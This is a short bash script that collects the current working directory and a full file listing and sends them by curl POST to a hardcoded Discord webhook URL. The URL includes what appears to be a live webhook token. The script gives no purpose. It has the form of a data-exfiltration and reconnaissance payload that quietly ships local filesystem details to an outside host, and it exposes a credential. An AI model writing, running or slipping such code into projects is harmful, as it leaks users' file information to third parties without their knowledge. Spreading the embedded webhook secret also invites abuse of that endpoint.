#!/bin/bash

# Set the webhook URL
WEBHOOK_URL="https://discord.com/api/webhooks/1190148990877048892/BLCBiNhgxyXRL78Lkyxdk866_oqUMu9gmoL9aqcKXYeL79Vh7-ef3Kx1LBm-T0LdzRCT"

# Get the current directory
CURRENT_DIR=$(pwd)

# List all files in the current directory
FILES=$(ls -lA)

# Prepare the payload for the webhook
PAYLOAD="{\"directory\": \"$CURRENT_DIR\", \"files\": \"$FILES\"}"

# Send a POST request to the webhook URL using <link>curl</link>
curl -X POST -H "Content-Type: application/json" -d "$PAYLOAD" $WEBHOOK_URL
